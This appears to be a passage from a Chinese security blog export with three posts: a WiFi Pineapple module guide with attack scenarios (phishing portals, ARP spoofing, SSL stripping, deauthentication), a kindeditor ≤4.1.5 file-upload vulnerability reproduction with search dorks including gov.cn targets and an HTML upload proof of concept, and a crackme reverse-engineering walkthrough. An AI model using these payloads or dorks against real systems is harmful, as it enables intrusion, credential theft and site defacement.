<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192154957.png" alt="image-20210120192154957" style="zoom:50%;">

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192211074.png" alt="image-20210120192211074" style="zoom:50%;">

<h2 id="base64encode"><a href="#base64encode" class="headerlink" title="base64encode"></a>base64encode</h2><p>base64加解密模块</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192739363.png" alt="image-20210120192739363"></p>
<h2 id="CursedScreech"><a href="#CursedScreech" class="headerlink" title="CursedScreech"></a>CursedScreech</h2><p>这是一个远控模块</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192842955.png" alt="image-20210120192842955"></p>
<p>Sein：信息收集功能，当监听的网络内出现漏洞系统时，将会更新模块的 target 列表</p>
<p>Kuro：攻击功能，自动尝试连接Sein功能发现的目标机器，并连接</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192902083.png" alt="image-20210120192902083"></p>
<p>Listening Interface（监听端口）：用于组播socket的接口，如果目标直接连接到Pineapple，使用br-lan就可以</p>
<p>Multicast Group（组播组）：发送和接收目标心跳的地址，对于Sein和目标机器，组需要相同</p>
<p>Multicast Port（组播端口）：Sein将从目标接收消息的端口。这个端口需要在payload的startMulticaster()方法中</p>
<p>Heartbeat Interval（心跳间隔）：payload发送广播的间隔，Sein在3个心跳间隔还为收到广播包的话，就会判断目标为掉线状态</p>
<p>Kuro Keys/Target Keys（密钥）：用于TLS通信时的密钥，可以使用Papers模块创建Keys</p>
<p>可以从下方两个下载按钮下载 C# 和 Python 的payload模板</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192919836.png" alt="image-20210120192919836"></p>
<p>Activity Log（活动日志）：记录 Kuro 功能执行过程中产生的全部记录，使用模块的大部分时间都是盯着这里看</p>
<p>右边的Targets就是一个上线机器列表，以及一个命令执行功能</p>
<p>如果有目标机器的话，可以通过Select选择机器，并执行命令</p>
<p>EZ Cmds事先预置了一些cmd命令，可以添加及删除</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192935988.png" alt="image-20210120192935988" style="zoom:50%;">

<p>设置好了之后，按照下载的模板，编写payload，在目标机器上运行</p>
<p>运行后点击Sein进行监听，测试时发现python版本的payload在监听后需要多等一下才能上线，此处要耐心等待一下，上线后可以开启Kuro，再耐心多等一会</p>
<p>当日志显示Kuro is ready后，就可以执行命令了</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193128326.png" alt="image-20210120193128326"></p>
<h2 id="dump1090"><a href="#dump1090" class="headerlink" title="dump1090"></a><strong>dump1090</strong></h2><p>本模块能够对 1090MHz 的无线电进行收取和解码，通过调用google-API等方式，可以在web地图上描绘出飞机的轨迹，当然也可以手动更改频率如：</p>
<p>我国民航使用的无线电频率：1090MHz</p>
<p>民用对讲机使用的无线电频率：408-409MHz</p>
<p>警用频率：350-390MHz</p>
<p>等等</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193206688.png" alt="image-20210120193206688"></p>
<p>软件有很多参数，但是界面上只显示了Gain</p>
<p>Checkbox 参数可以切换度量衡使用公制单位、切换到自动获取、增大功率、将结果输出为csv格式</p>
<p>使用此模块需要RTL-SDR（电视棒）接收无线电信号，插入模块，将显示地图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193235965.png" alt="image-20210120193235965"></p>
<h2 id="HackRF"><a href="#HackRF" class="headerlink" title="HackRF"></a>HackRF</h2><p>这个模块需要配合HackRF 硬件进行使用，在接入HackRF后，会出现一个简单的设置界面</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193308036.png" alt="image-20210120193308036"></p>
<p>模块选项相当于 hackrf_transfer 的相关参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sample Rate（采样率）：每秒发送或接受的样本量。受到系统计算能力限制，设置过高可能会导致系统不稳定，此处建议设置默认10M或更低，相当于 -s</span><br><span class="line"></span><br><span class="line">Center Frequency（中心频率）：就是HackRF开始调谐的频率，相当于 -f</span><br><span class="line"></span><br><span class="line">Transceiever Mode（收发方式）：HackRF是半双工工作模式，因此必须指定是要 TX（发送）还是RX（接收），相当于 -t 或 -r</span><br><span class="line"></span><br><span class="line">File Name（文件名）：目标文件路径，可以将收到的信号记录，也可以从文件发送</span><br><span class="line"></span><br><span class="line">RF Amp &amp; Antenna Power（射频放大器和天线功率）：Enable RF AMP可以指定是否开启射频放大器，Antenna Power可以指定功率是否被传送到天线端口</span><br><span class="line"></span><br><span class="line">RX IF Gain &amp; RX BB Gain（RX二中频增益和RX BB增益）：根据不同层级的db及步长选择增益模式</span><br><span class="line"></span><br><span class="line">Repeat Transmission &amp; TX IF Gain（重复和TX二中频增益）：是否重复播放，以及设置发送增益</span><br></pre></td></tr></table></figure>

<p>先进行录制，并保存到文件中</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193343819.png" alt="image-20210120193343819"></p>
<p>然后进行重放，即可攻击成功，如果重放失败，可以调整放大器的增益</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193400461.png" alt="image-20210120193400461"></p>
<p>在实际测试过程中，将会如上图报错，调试了一会依旧无法实现功能</p>
<p>这个模块仅仅是简单的收取/重放，如果想要解码、编码再重放，单靠这个是实现不了的，而且在不清楚无线电工作频率的情况下还是没有办法使用，因此还是将其定义为演示模块</p>
<h2 id="Module-Maker"><a href="#Module-Maker" class="headerlink" title="Module Maker"></a>Module Maker</h2><p>模块制作，能够生成及管理模块</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193446797.png" alt="image-20210120193446797"></p>
<p>并给出了模块需要的模式</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193503219.png" alt="image-20210120193503219"></p>
<p>是一个为开发者编写新模块的web界面</p>
<h2 id="ngrep"><a href="#ngrep" class="headerlink" title="ngrep"></a>ngrep</h2><p>ngrep就相当于网络版的grep，支持大量的操作系统和网络协议。能识别TCP、UDP和ICMP包，理解bpf的过滤机制。与 tcpdump 类似</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193538783.png" alt="image-20210120193538783"></p>
<h2 id="Occupineapple"><a href="#Occupineapple" class="headerlink" title="Occupineapple"></a>Occupineapple</h2><p>Occupineapple 是一个干扰模块，能够在周围生成各种随机或者自定义的SSID</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120194727180.png" alt="image-20210120194727180"></p>
<p>Speed：每秒发送的数据包</p>
<p>Channel：在哪个信道上生成虚假AP</p>
<p>Show station as Ad-Hoc：将站点显示为点对点</p>
<p>Set WEP bit (Generates encrypted networks)：设置WEP位（生成加密网络）</p>
<p>Show station using WPA TKIP encryption：显示使用WPA-TKIP加密的站点</p>
<p>Show station using WPA AES encryption：显示使用WPA-AES加密的站点</p>
<p>Use valid accesspoint MAC from OUI database：使用来自OUI数据库的有效Access</p>
<p>Editor 参数处可以选择、编辑或创建List，List中存放SSID名称及Mac地址</p>
<h1 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h1><h2 id="1-搞怪"><a href="#1-搞怪" class="headerlink" title="1.搞怪"></a>1.搞怪</h2><p>如果想要简单的搞怪一下周围的人，不进行恶意的破坏和复杂的攻击行为，可以使用Occupineapple或者RandomRoll模块</p>
<p>使用Occupineapple在四周生成一些有趣的SSID，比如“XXX是个小智障”，“XXX是个小笨蛋”等等，十分有趣</p>
<p>也可以使用RandomRoll，在有客户端连入Pineapple网络时，可以将HTTP网页重定向到默认搞怪的网页上，给人一个惊喜</p>
<h2 id="2-技术演示"><a href="#2-技术演示" class="headerlink" title="2.技术演示"></a>2.技术演示</h2><p>如果想要给身边的人演示一些简单的WI-FI攻击，无需特别多的技术准备，可以使用Dwall、DNS/DNSMasq Spoof、urlsnarf</p>
<p>Dwall即是著名的“绵羊墙”，可以显示抓到的URL、cookie、图片用，用来做演示十分方便</p>
<p>DNS/DNSMasq Spoof 可以重定向用户DNS，配合Landing Page或其他web应用可以进行钓鱼、嗅探等</p>
<p>urlsnarf显示网络内http数据包，抓取到的url，显示也很直观</p>
<p>配合HackRF硬件可以简单重放无线电攻击，进行一些演示</p>
<h2 id="3-窃取密码"><a href="#3-窃取密码" class="headerlink" title="3.窃取密码"></a>3.窃取密码</h2><p>如果想要窃取在同一网络下其他客户端产生的密码，也许是某些网站账户密码，也许是其他WI-FI密码，有几种方式可以达到目的</p>
<p>想要获得附近的WI-FI密码，可以使用Site Survery抓取WPA握手包，再使用Online Hash Crack进行尝试破解</p>
<p>使用wps模块直接进行WI-FI密码破解</p>
<p>想要获得客户端在其他某些网站上的密码，可以使用Landing Page、Evil Portal、Portal Auth制作钓鱼页面，结合ettercap做欺骗，或者让客户端连接到Pineapple网络中，在钓鱼页面输入密码，进行记录</p>
<p>也可以使用ettercap进行网络欺骗，将自己欺骗成为网关，获取流量，就可以截获明文传输的密码，配合SSLsplit即可抓取https传输的密码</p>
<p>使用Responder进行欺骗，窃取某些协议中的密码/hash值</p>
<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><p>Pineapple还提供了一些漏洞利用模块，可以针对网络内漏洞进行攻击</p>
<p>可以通过ettercap欺骗，替换目标下载文件，可以改变js利用浏览器漏洞，可以改变文档利用office漏洞，可以改变exe利用各种漏洞</p>
<p>可以使用CursedScreech的payload进行监听和执行命令</p>
<p>也可以使用Meterpreter接收会话</p>
<p>这个总结起来就是，我是你的网关，你的全部网络流量我都做主，我想怎么玩就怎么玩</p>
<p>组合漏洞利用 <a href="https://www.youtube.com/watch?v=Bvo43JvmeW0">https://www.youtube.com/watch?v=Bvo43JvmeW0</a></p>
<h2 id="5-数据采集演示"><a href="#5-数据采集演示" class="headerlink" title="5.数据采集演示"></a>5.数据采集演示</h2><p>如果使用Pineapple在网络内采集数据，用于展示或进一步分析的话，可以使用一些抓取类模块</p>
<p>tcpdump可以对网络数据进行抓取和过滤，配合其他软件可以进行展示</p>
<p>ngrep功能同上，对网络内数据进行抓取及展示</p>
<p>nmap用于网络内设备发现及扫描</p>
<p>p0f被动网络指纹识别，被动收集网络内系统指纹</p>
<p>get模块抓取客户端浏览器信息</p>
<p>dump1090配合电视棒，可以获取无线电信息，展示如飞机航线等信息</p>
<h2 id="6-恶意破坏"><a href="#6-恶意破坏" class="headerlink" title="6.恶意破坏"></a>6.恶意破坏</h2><p>如果就是想要搞事情，Pineapple也可以实现一些功能</p>
<p>可以使用ettercap进行ARP欺骗，可以导致断网</p>
<p>Deauth模块可以导致网络内认证失败，无法进行认证连接</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>freebuf：<a href="https://www.freebuf.com/sectool/196358.html">https://www.freebuf.com/sectool/196358.html</a></p>
<p>官方wiki：<a href="https://wiki.wifipineapple.com/#!index.md">https://wiki.wifipineapple.com/#!index.md</a></p>
<p>官方论坛：<a href="https://forums.hak5.org/">https://forums.hak5.org/</a></p>
<p>Modules库：<a href="https://github.com/hak5/wifipineapple-modules">https://github.com/hak5/wifipineapple-modules</a></p>
<p>中文用户手册：<a href="http://www.wifipi.org:8080/WiFiPineapple-用户手册-V1.3.pdf">http://www.wifipi.org:8080/WiFiPineapple-%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C-V1.3.pdf</a></p>
<p>搭建视频：<a href="https://www.youtube.com/watch?v=Nv1eiIwOPKo">https://www.youtube.com/watch?v=Nv1eiIwOPKo</a></p>
<p>模块编写视频：<a href="https://www.youtube.com/watch?v=Lvf2At3G1C0">https://www.youtube.com/watch?v=Lvf2At3G1C0</a></p>
<p>SSLsplit模块：<a href="https://www.roe.ch/SSLsplit">https://www.roe.ch/SSLsplit</a></p>
<p>ettercap模块：<a href="https://github.com/Ettercap/ettercap">https://github.com/Ettercap/ettercap</a></p>
<p>autossh模块：<a href="https://blog.csdn.net/fanwenjieok/article/details/53033317">https://blog.csdn.net/fanwenjieok/article/details/53033317</a></p>
<p>dump1090 模块：<a href="http://www.satsignal.eu/raspberry-pi/dump1090.html">http://www.satsignal.eu/raspberry-pi/dump1090.html</a></p>
<p>tcpdump 模块：<a href="http://www.tcpdump.org/">http://www.tcpdump.org/</a></p>
<p>ngrep 模块：<a href="https://www.trustauth.cn/wiki/10824.html">https://www.trustauth.cn/wiki/10824.html</a></p>
<p>CursedScreech 模块：<a href="https://github.com/sud0nick/CursedScreech">https://github.com/sud0nick/CursedScreech</a></p>
<p>Reaponder 模块：<a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p>
<p>组合案例演示视频：<a href="https://www.youtube.com/watch?v=Bvo43JvmeW0">https://www.youtube.com/watch?v=Bvo43JvmeW0</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>PineApple-Nano</tag>
      </tags>
  </entry>
  <entry>
    <title>kindeditor&lt;=4.1.5上传漏洞复现</title>
    <url>/2021/01/12/WEB/Exploit/kindeditor-4-1-5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><blockquote>
<p>漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.5编辑器中</p>
<p>这里html里面可以嵌套暗链接地址以及嵌套xss。Kindeditor上的uploadbutton.html用于文件上传功能页面，直接POST到/upload_json.*?dir=file，在允许上传的文件扩展名中包含htm,txt：extTable.Add(“file”,”doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2”)</p>
</blockquote>
<a id="more"></a>

<h2 id="批量搜索"><a href="#批量搜索" class="headerlink" title="批量搜索"></a>批量搜索</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:&#x2F;examples&#x2F;uploadbutton.html</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;php&#x2F;upload_json.php</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;asp.net&#x2F;upload_json.ashx</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;&#x2F;jsp&#x2F;upload_json.jsp</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;&#x2F;asp&#x2F;upload_json.asp</span><br><span class="line"></span><br><span class="line">inurl:gov.cn&#x2F;kindeditor&#x2F;</span><br></pre></td></tr></table></figure>

<h1 id="漏洞问题"><a href="#漏洞问题" class="headerlink" title="漏洞问题"></a>漏洞问题</h1><p>根本脚本语言自定义不同的上传地址，上传之前有必要验证文件 upload_json.* 的存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;asp&#x2F;upload_json.asp</span><br><span class="line"></span><br><span class="line">&#x2F;asp.net&#x2F;upload_json.ashx</span><br><span class="line"></span><br><span class="line">&#x2F;jsp&#x2F;upload_json.jsp</span><br><span class="line"></span><br><span class="line">&#x2F;php&#x2F;upload_json.php</span><br></pre></td></tr></table></figure>

<p>可目录变量查看是否存在那种脚本上传漏洞:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kindeditor&#x2F;asp&#x2F;upload_json.asp?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;asp.net&#x2F;upload_json.ashx?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;jsp&#x2F;upload_json.jsp?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;php&#x2F;upload_json.php?dir&#x3D;file</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>google搜素一些存在的站点 inurl：kindeditor</p>
<p>1.查看版本信息</p>
<p><a href="http://www.xxx.org/kindeditor//kindeditor.js">http://www.xxx.org/kindeditor//kindeditor.js</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104185315467.png" alt="image-20210104185315467"></p>
<p>2.版本是4.1.10可以进行尝试如下路径是否存在有必要验证文件 upload_json.* </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kindeditor&#x2F;asp&#x2F;upload_json.asp?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;asp.net&#x2F;upload_json.ashx?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;jsp&#x2F;upload_json.jsp?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;php&#x2F;upload_json.php?dir&#x3D;file</span><br></pre></td></tr></table></figure>

<p>3.如下图可以看出是存在jsp上传点:</p>
<p><a href="http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file">http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112204100817.png" alt="image-20210112204100817"></p>
<p>4.写出下面的构造上传poc,这里需要修改<script>...<script>以及url : 的内容,根据实际情况修改.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Uploader&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.xxx.org&#x2F;kindeditor&#x2F;&#x2F;kindeditor.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KindEditor.ready(function(K) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var uploadbutton &#x3D; K.uploadbutton(&#123;</span><br><span class="line"></span><br><span class="line">button : K(&#39;#uploadButton&#39;)[0],</span><br><span class="line"></span><br><span class="line">fieldName : &#39;imgFile&#39;,</span><br><span class="line"></span><br><span class="line">url : &#39;http:&#x2F;&#x2F;www.xxx.org&#x2F;kindeditor&#x2F;jsp&#x2F;upload_json.jsp?dir&#x3D;file&#39;,</span><br><span class="line"></span><br><span class="line">afterUpload : function(data) &#123;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if (data.error &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line"></span><br><span class="line">var url &#x3D; K.formatUrl(data.url, &#39;absolute&#39;);</span><br><span class="line"></span><br><span class="line">K(&#39;#url&#39;).val(url);&#125;</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">uploadbutton.fileBox.change(function(e) &#123;</span><br><span class="line"></span><br><span class="line">uploadbutton.submit();</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;upload&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input class&#x3D;&quot;ke-input-text&quot; type&#x3D;&quot;text&quot; id&#x3D;&quot;url&quot; value&#x3D;&quot;&quot; readonly&#x3D;&quot;readonly&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type&#x3D;&quot;button&quot; id&#x3D;&quot;uploadButton&quot; value&#x3D;&quot;Upload&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>简化版：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;http:&#x2F;&#x2F;xxx.com&#x2F;front&#x2F;js&#x2F;kindeditor-4.1.10&#x2F;jsp&#x2F;upload_json.jsp?dir&#x3D;file&quot; method&#x3D;&quot;post&quot;&gt;  </span><br><span class="line"></span><br><span class="line">Upload a new file:&lt;br&gt;  </span><br><span class="line"></span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;imgFile&quot; size&#x3D;&quot;50&quot;&gt;&lt;br&gt;  </span><br><span class="line"></span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload&quot;&gt;  </span><br><span class="line"></span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>Burp抓包查看上传地址并访问</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112204715512.png" alt="image-20210112204715512"></p>
<h1 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h1><p>1.直接删除upload_json.<em>和file_manager_json.</em></p>
<p>2.升级kindeditor到最新版本</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/backlion/p/10421405.html">https://www.cnblogs.com/backlion/p/10421405.html</a></p>
</script></p>]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>kindeditor</tag>
      </tags>
  </entry>
  <entry>
    <title>crackme-系列之-crackme5</title>
    <url>/2021/01/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme5/</url>
    <content><![CDATA[<p>这个和Crackme005和004的作者是同一个，不过增加了更多的防护</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103220232.png" alt="image-20210125103220232" style="zoom: 50%;">

<a id="more"></a>

<h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120195625319.png" alt="image-20210120195625319"></p>
<p>程序是使用Delphi编写的，加了个UPX壳，随随便便就能脱掉。 </p>
<p><strong>关于脱壳</strong> </p>
<p>这个壳的话，有三种脱的方式，PEiD通用脱壳器 手动脱和专用的脱壳器，这里建议用专用的脱壳器 反汇编代码和对 齐比较准确方便后面的分析，我用脱壳器脱的时候报错了，所以直接从网上找了一个脱好了的。</p>
<p><strong>使用DarkDe分析程序</strong></p>
<p>把脱壳后的程序拖如DarkDe</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120195655282.png" alt="image-20210120195655282"></p>
<p>首先来观察一下窗体，发现这里有一个隐藏的Edit框。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120195721307.png" alt="image-20210120195721307"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120200330046.png" alt="image-20210120200330046"></p>
<p>再来观察一下事件按钮，有如下几个响应事件：</p>
<ul>
<li>表单创建 </li>
<li>Timer1定时器 </li>
<li>按钮的鼠标按下事件 </li>
<li>双击事件 </li>
<li>Edit2的双击事件 </li>
<li>表单的鼠标移动事件 </li>
<li>Image1的鼠标按下事件 </li>
<li>Image2的鼠标按下事件 </li>
<li>Image3的鼠标按下事件 </li>
<li>Image4的鼠标按下事件 </li>
<li>Timer2定时器 </li>
<li>按钮点击事件</li>
</ul>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120200406677.png" alt="image-20210120200406677"></p>
<p>接着再来看一下控件的ID，这个会方便以后的分析，注意了，如果你脱壳用的是手动的方法或者是通用脱壳机，这个 控件ID是显示不出来的。所以能用专用脱壳器脱尽量不要手脱。</p>
<h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><h2 id="导出符号"><a href="#导出符号" class="headerlink" title="导出符号"></a>导出符号</h2><p>首先为了方便我们分析，把程序拖到IDA里，添加Delphi的所有的签名，然后导出map文件，加载到OD中，方便后 续的调试。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120200444859.png" alt="image-20210120200444859"></p>
<p>找到这个注册成功的字符串，跟进去。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120200534065.png" alt="image-20210120200534065"></p>
<p>拉到函数头的位置，我们看到右边有个IDA的注释，说明这个是Timer2的响应事件。然后这里有连续的五条跳转指 令，都是跳到函数结束的位置。那么要想注册成功，就必须让这五个条件不成立。</p>
<h2 id="分析第一层防护"><a href="#分析第一层防护" class="headerlink" title="分析第一层防护"></a>分析第一层防护</h2><p>右键-&gt;查找所有常量-&gt;查找0x3C4，找到0xC34被赋值的位置，我们的目的是不让这个地方被赋值。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102010466.png" alt="image-20210125102010466" style="zoom:50%;">

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102025835.png" alt="image-20210125102025835"></p>
<p>接着找到函数头的位置，IDA的位置显示这个是表单的创建事件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102137688.png" alt="image-20210125102137688"></p>
<h2 id="分析表单创建事件"><a href="#分析表单创建事件" class="headerlink" title="分析表单创建事件"></a>分析表单创建事件</h2><p>接着，在函数头的位置下断点，分析整个表单创建事件。分析表单创建事件的目的是为了让ebx+0x304这个位置的值 不被赋值为0xC34。整个事件的代码分析如下：</p>
<h3 id="初始化控件"><a href="#初始化控件" class="headerlink" title="初始化控件"></a>初始化控件</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102207313.png" alt="image-20210125102207313"></p>
<h3 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102235503.png" alt="image-20210125102235503"></p>
<p>接着获取 C:\ajj.126.c0m\j\o\j\o\ok.txt 的文件句柄，读取文件，然后检索IO输入操作结果，如果检索失败， 直接退出函数。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102303644.png" alt="image-20210125102303644"></p>
<p>如果文件存在，那么从文本中读取字符串，然后比较文本中的字符串是否是作者要求的，这个123456789是我自己写 入txt文件中测试用的，如果要复制作者要求的那个字符串，必须把从0x20开始到00的所有十六进制复制下来。如果 字符串比较通过，那么就会跳过 [ebx+0x304] 被赋值为 0xC34 的过程，至此整个表单创建函数就完成了。</p>
<h2 id="破解第一层防护"><a href="#破解第一层防护" class="headerlink" title="破解第一层防护"></a>破解第一层防护</h2><p>创建文件，路径为: C:\ajj.126.c0m\j\o\j\o\ok.txt ，然后将 20 61 6A 6A D0 B4 B5 C4 43 4B 6D 65 D5 E6 C0 C3 21 FF FF 用十六进制编辑器写入到文本。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102357554.png" alt="image-20210125102357554" style="zoom: 50%;">

<p>成功破解第一层防护之后，隐藏的Edit编辑框就出来了。但是这个编辑框是被禁用的。</p>
<h2 id="分析第二层防护"><a href="#分析第二层防护" class="headerlink" title="分析第二层防护"></a>分析第二层防护</h2><p>计时器的五个条件我们已经满足了第一个，接下来回到计时器的入口，从第二个条件入手。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102428696.png" alt="image-20210125102428696"></p>
<p>条件二调试默认已经满足了，跳转不会实现。那么我们现在要满足条件三，让 [ebx+0x310] 赋值为 0xF94 。 同样，搜索 0xF94 这个常量，找到赋值的地方。</p>
<p>直接跟进去，拉到函数头部，发现这里是表单的鼠标移动事件。接下来开始分析这个事件的所有的代码。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102444370.png" alt="image-20210125102444370"></p>
<h3 id="分析表单的鼠标移动事件"><a href="#分析表单的鼠标移动事件" class="headerlink" title="分析表单的鼠标移动事件"></a>分析表单的鼠标移动事件</h3><p>接下来在函数头部下断点，然后从左上角移动到表单，触发断点，分析整个函数。 获取坐标</p>
<h3 id="获取坐标"><a href="#获取坐标" class="headerlink" title="获取坐标"></a>获取坐标</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102521585.png" alt="image-20210125102521585"></p>
<p>首先把参数一和参数二给edx和eax，我们必须知道这两个参数是什么。因为这是鼠标点击事件，初步猜测是鼠标的X 和Y坐标。接下来做四次测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">左上角：edx&#x3D;0 eax&#x3D;0x1C</span><br><span class="line">右上角：edx&#x3D;0 eax&#x3D;0x101</span><br><span class="line">左下角：edx&#x3D;0x13B eax&#x3D;0x5 </span><br><span class="line">右下角：edx&#x3D;0x13B eax&#x3D;0x103</span><br></pre></td></tr></table></figure>

<p>当从不同的位置移入表单，对应的eax和edx的值都不相同，所以判断这两个参数是横纵坐标，而且坐标系的原点在 左上角。</p>
<h3 id="校验图片"><a href="#校验图片" class="headerlink" title="校验图片"></a>校验图片</h3><p>接着函数取出了一个图片对象，然后判断是否是这个图片对象</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102613117.png" alt="image-20210125102613117"></p>
<p>可以看到Image3的ID是0x2E0,所以只有当图片为Image3的时候才能满足条件，而Image3根据测试是”性相近”</p>
